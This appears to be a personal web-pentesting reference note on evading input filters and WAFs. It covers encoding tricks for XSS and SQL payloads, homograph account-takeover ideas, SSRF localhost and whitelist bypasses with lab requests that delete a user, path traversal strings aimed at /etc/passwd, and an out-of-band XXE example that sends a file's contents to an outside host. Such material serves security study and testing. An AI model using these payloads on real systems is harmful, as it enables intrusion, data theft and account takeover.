>[!important]
>When constructing an attack, you should think about where exactly your payload is being injected. If you can infer how your input is being decoded based on this context, you can potentially identify alternative ways to represent the same payload.

# Encoding examples

Both clients and servers use a variety of different encodings to pass data between systems. When they want to actually use the data, this often means they have to decode it first. The exact sequence of decoding steps that are performed depends on the context in which the data appears. For example, a query parameter is typically URL decoded server-side, while the text content of an HTML element may be HTML decoded client-side.

When constructing an attack, you should think about where exactly your payload is being injected. If you can infer how your input is being decoded based on this context, you can potentially identify alternative ways to represent the same payload.

### URL encoding & double URL encoding

Substituting with a % character and their 2-digit hex code as follows:

```
# Url encoding
[...]/?search=Fish+%26+Chips
[...]/?search=Fish%20%26%20Chips
[...]/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

# Double Url encoding
[...]/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

## HTML encoding

Substituting the offending characters with a reference, prefixed with an ampersand and terminated with a semicolon. In many cases, a name can be used for the reference.
Interestingly, when using decimal or hex-style HTML encoding, you can optionally include an arbitrary number of leading zeros in the code points. Some WAFs and other input filters fail to adequately account for this.

```html
<img src=x onerror="&#x61;lert(1)&semi;">
<a href="javascript&#00000000000058;alert(1)">Click me</a>
```

## XML encoding

XML is closely related to HTML and also supports character encoding using the same numeric escape sequences. This enables you to include special characters in the text content of elements without breaking the syntax, which can come in handy when testing for XSS via XML-based input, for example.

```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

## Unicode escaping

Unicode escape sequences consist of the prefix `\u` followed by the four-digit hex code for the character. For example, \u003a represents a colon. ES6 also supports a new form of unicode escape using curly braces: `\u{3a}`.

```html
<a href="javascript\u0061alert(1)">Click me</a>
<a href="javascript\u{0000000003a}alert(1)">Click me</a>
```

## Unicode normalization

Unicode normalization is a process that ensures different binary representations of characters are standardized to the same binary value. This process is crucial in dealing with strings in programming and data processing. [^unicode-norm]

[^unicode-norm]: [Unicode normalization](https://book.hacktricks.xyz/pentesting-web/unicode-injection/unicode-normalization), hacktricks.xyz

An example of how Unicode normalise two different bytes representing the same character:

```php
unicodedata.normalize("NFKD","chloe\u0301") == unicodedata.normalize("NFKD", "chlo\u00e9")
```

**A list of Unicode equivalent characters can be found here:** [https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html) and [https://0xacb.com/normalization_table](https://0xacb.com/normalization_table)

If you can find inside a webapp a value that is being echoed back, you could try to send **‘KELVIN SIGN’ (U+0212A)** which **normalises to "K"** (you can send it as `%e2%84%aa`). **If a "K" is echoed back**, then, some kind of **Unicode normalisation** is being performed.

Other **example**: `%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` after **unicode** is `Leonishan`.

<iframe width="660" height="415" src="https://www.youtube.com/embed/SMC1HDFGwvU" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

## Hex & octal escaping

Another option when injecting into a string context is to use hex escapes, which represent characters using their hexadecimal code point, prefixed with \x. For example, the lowercase letter a is represented by `\x61`.

```html
<a href="javascript:\x61lert">Click me</a>                          <!-- Obfuscation via HEX encoding -->
```

>[!note]
>You can sometimes also obfuscate SQL statements in a similar manner using the prefix 0x. For example, `0x53454c454354` may be decoded to form the `SELECT` keyword.

Octal escaping works in pretty much the same way as hex escaping, except that the character references use a base-8 numbering system rather than base-16. These are prefixed with a standalone backslash, meaning that the lowercase letter a is represented by `\141`.

```html
<a href="javascript:\141lert">Click me</a>                          <!-- Obfuscation via Octal encoding -->
```

## SQL CHAR() function

Although not strictly a form of encoding, in some cases, you may be able to obfuscate your SQL injection attacks using the `CHAR()`function. This accepts a single decimal or hex code point and returns the matching character. Hex codes must be prefixed with `0x`. For example, both `CHAR(83)` and `CHAR(0x53)` return the capital letter `S`.

```sql
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84) id FROM table; -- - Decoded in "SELECT id FROM table;"
```

## Homograph characters

Try to use homograph characters instead of classic ASCII ones and analyze how the server behaves. You may be able to perform [Authentication Attacks](Authentication%20Attacks.md), [Password Reset Poisoning](Password%20Reset%20Poisoning.md), and potentially perform account takeover.

>[!example] 
>Requesting a password reset for vítim@gmail.com (attacker controller email) it may be possible to obtain a password reset link for user victim@gmail.com

---

# Evasion use cases

## Evading IP restrictions

Some applications block input containing hostnames like `127.0.0.1` and `localhost`.

You can circumvent the filer using:
- Alternative IP representation of `127.0.0.1` (such as `2130706433`, `017700000001`, or `127.1`.) [^localhost-bypass]
- IPv6 (`0000:0000:0000:0000:0000:0000:0000:0001` or `: :1`)
- Your own domain name that resolves to `127.0.0.1` or any other desired IP [^nip.io][^dns-reb]

[^nip.io]: [nip.io](https://nip.io/)
[^dns-reb]: [DNS rebinding](../Services/DNS%20-%20Domain%20Name%20System.md#DNS%20rebinding)

[^localhost-bypass]: [SSRF bypass list by h4x0r_fr34k](../../Readwise/Tweets/h4x0r_fr34k%20on%20Twitter%20-%20Tweets%20From%20VAIDIK%20PANDYA.md#^2da607)
## Evading match case strings

Some applications block input containing sensitive words or URLs, like `/admin` or SQL statements.

You can circumvent the filter using:
- Alternatives [Encoding examples](Evading%20Restrictions.md#Encoding%20examples) (like url-encode, hex, HTML entity, double url-encode, [XSS Filtering bypass](Cross-Site%20Scripting%20(XSS).md#XSS%20Filtering%20bypass), etc.)
- Case variation
- ["Matrioska" stings](Prototype%20Pollution%20client-side.md#Bypassing%20flawed%20key%20sanitization) (useful when the application fails to sanitize input recursively)

## Evading whitelist-based input filters

Some applications only allow input that matches, begins with, or contains, a whitelist of permitted values.

You can sometimes circumvent the filter by exploiting inconsistencies in URL parsing (aka exploiting **parser differentials**):

- Embed credentials in a URL before the hostname (`https://expected-host@evil-host`)
- Use the `#` character to indicate a URL fragment (`https://evil-host#expected-host`)
- Leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control (`https://expected-host.evil-host`)
- URL-encode characters to confuse the URL-parsing code. *This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.* (`example@gmail.com` vs `example@gmail.com%0d`)
- Exploit [Open Redirection](Open%20Redirection.md) vulnerabilities to bypass strictly validated trusted domains (eg. imagine the server accepts only the domain weliketoshop.net, the following open redirect would allows an SSRF to 129.168.0.68: `http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin`)
>[!example]
>```http
>POST /product/stock HTTP/1.1
>Host: 0a40008604dc1e84c293433200fb0054.web-security-academy.net
>Cookie: session=euJyrsJeSgzirZkV6Hvxy7CpYOzlen4h
>Content-Length: 201
>Connection: close
>
>storeId=1&stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttps%3a//127.0.0.1/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
>```
- Mix multiple techniques together
>[!example]
>SSRF using double url-encoding and HTTP credentials
>```http
>POST /product/stock HTTP/1.1
>Host: 0a7100e0036d60c9c2c90c6b0072001b.web-security-academy.net
>Cookie: session=NnrIA2v71rTLnuds4qpbsbH6psfcgm2l
>Content-Length: 95
>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
>Content-Type: application/x-www-form-urlencoded
>Accept: */*
>Connection: close
>
>stockApi=http://localhost:80%252f%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
>```
- Evading restrictions importing data fromelsewhere using out-of-band requests
>[!example] Example of OOB [XML External Entity Injection (XXE Injection)](XML%20External%20Entity%20Injection%20(XXE%20Injection).md)
>
>```xml
><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
><!DOCTYPE foo [
>    <!ENTITY % xxe SYSTEM "{YOUR_NGORK_URL}/ext.dtd">
>    %xxe;
>]>
><foo>&exfil;</foo>
>```
>*/ext.dtd*:
>```xml
><!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
><!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://192.168.1.199/bypass.xml?%data;'>">
>%abt;
>```
>From [WAFfle-y Order](../../Play%20ground/CTFs/WAFfle-y%20Order.md)
- [Blind XXE by repurposing a local DTD](XML%20External%20Entity%20Injection%20(XXE%20Injection).md#Blind%20XXE%20by%20repurposing%20a%20local%20DTD)
- [Exploit ambiguity](Host%20Header%20attacks.md#Exploit%20ambiguity)


## Evading path, file and shell restrictions

Many applications that place user input into file paths implement some kind of defense against path traversal attacks, and these can often be circumvented.

- Full path instead of `../../../../../file`
- Nested traversals to bypass sequences stripped non-recursively (`....//....//....//....//etc/passwd` or `....\/....\/....\/....\/file`)
- Encoding, double-url encoding or using non-standard encodings (`%2e%2e%2f`, `%252e%252e%252f`, `..%c0%af` or `..%ef%bc%8f` )
- Appending the arbitrary payload to a trusted accepted starting path (`filename=/var/www/images/../../../../../../etc/passwd`)
- Null-bytes to bypass extensions controls (`filename=../../../../../../../etc/passwd%00.png`)
- Using the fuzzing list (Fuzzing - path traversal)
- [Basic LFI and bypasses](File%20Inclusion%20(LFI%20&%20RFI).md#Basic%20LFI%20and%20bypasses)
- [Command Injection Bypasses](Command%20Injection.md#Bypasses)
- [Obfuscating file extensions](Insecure%20File%20Upload.md#Obfuscating%20file%20extensions)

## Evading SQL query detection

- [Avoid quotes and double quotes](SQL%20Injection.md#Avoid%20quotes%20and%20double%20quotes)
- [Abusing JSON-Based SQL to Bypass WAF](SQL%20Injection.md#Abusing%20JSON-Based%20SQL%20to%20Bypass%20WAF)

## Evading security controls using smuggling

- [Exploiting HTTP Request Smuggling](Exploiting%20HTTP%20Request%20Smuggling.md)

## Evading Secure Cookies using the Path attribute

Cookies having the Secure flag cannot be used with JavaScript. 
However, a common bypass, is setting a specific cookie for a specific path using the `path` attribute.
In the cookie specification and implementation, specifically dedicated cookies implementing the `path` attribute are prioritised over global ones.

<iframe width="560" height="315" src="https://www.youtube.com/embed/SMC1HDFGwvU?si=kW8PsmPfBkteYBnu&amp;start=932" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

# Other resources

- [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- [XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PortSwigger Research - Concealing Payloads in URL Credentials](../../Readwise/Articles/PortSwigger%20Research%20-%20Concealing%20Payloads%20in%20URL%20Credentials.md)
- [A new era of SSRF](https://portswigger.net/research/top-10-web-hacking-techniques-of-2017#1)
- [SSRF: A complete guide to exploiting advanced SSRF vulnerabilities](https://blog.intigriti.com/hacking-tools/ssrf-a-complete-guide-to-exploiting-advanced-ssrf-vulnerabilities)
- [Introducing the URL Validation Bypass Cheat Sheet](../../Readwise/Articles/PortSwigger%20Research%20-%20Introducing%20the%20URL%20Validation%20Bypass%20Cheat%20Sheet.md) #tools 
- [Cache parameter cloaking](Web%20Cache%20Poisoning.md#Cache%20parameter%20cloaking)
- [HTTP Parameter Pollution (HPP)](HTTP%20Parameter%20Pollution%20(HPP).md)
- [HTTP Verb Tampering](HTTP%20Verb%20Tampering.md)
- [Empty Referer bypass](https://tutorialboy.medium.com/talking-about-jsonp-hijacking-vulnerability-f1668ec633c5#:~:text=Empty%20Referer%20bypass) 
	- using `<iframe>`
	- using `<head><meta name=”referrer” content=”no-referrer”></head>`
	- using `<iframe src=data://text/html;base64,...>`
- Use [4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3)
- Bypass [WAFs](../Dev,%20scripting%20&%20OS/WAF.md) exploiting their length-limitations [^nowafplease]
- [When WAFs Go Awry: Common Detection & Evasion Techniques for Web Application Firewalls](../../Readwise/Articles/Admin%20-%20When%20WAFs%20Go%20Awry%20Common%20Detection%20&%20Evasion%20Techniques%20for%20Web%20Application%20Firewalls.md)
- [mXSS](../../Readwise/Articles/sonarsource.com%20-%20mXSS%20The%20Vulnerability%20Hiding%20in%20Your%20Code.md)
	- [Flatt Security XSS Challenge - Writeup](../../Readwise/Articles/blig.one%20-%20Flatt%20Security%20XSS%20Challenge%20-%20Writeup.md)
- [Bug Bounty Reports Explained - $25k GitHub Account Takeover & justCTF 2023 CSRF+XSS Writeup](../../Readwise/Articles/Bug%20Bounty%20Reports%20Explained%20-%20$25k%20GitHub%20Account%20Takeover%20&%20justCTF%202023%20CSRF+XSS%20Writeup.md) (parsing vs tokenization ft. html namespaces)
- [Bypassing WAFs With the Phantom $Version Cookie](../../Readwise/Articles/PortSwigger%20Research%20-%20Bypassing%20WAFs%20With%20the%20Phantom%20$Version%20Cookie.md)
- [Encoding Differentials: Why Charset Matters](../../Readwise/Articles/sonarsource.com%20-%20Encoding%20Differentials%20Why%20Charset%20Matters.md)


[^nowafplease]: [Bad Sector Labs Blog - Jun 17 2024 Last Week in Security (LWiS) - 2024-06-17](../../Readwise/Articles/Bad%20Sector%20Labs%20Blog%20-%20Jun%2017%202024%20Last%20Week%20in%20Security%20(LWiS)%20-%202024-06-17.md#^88de29)
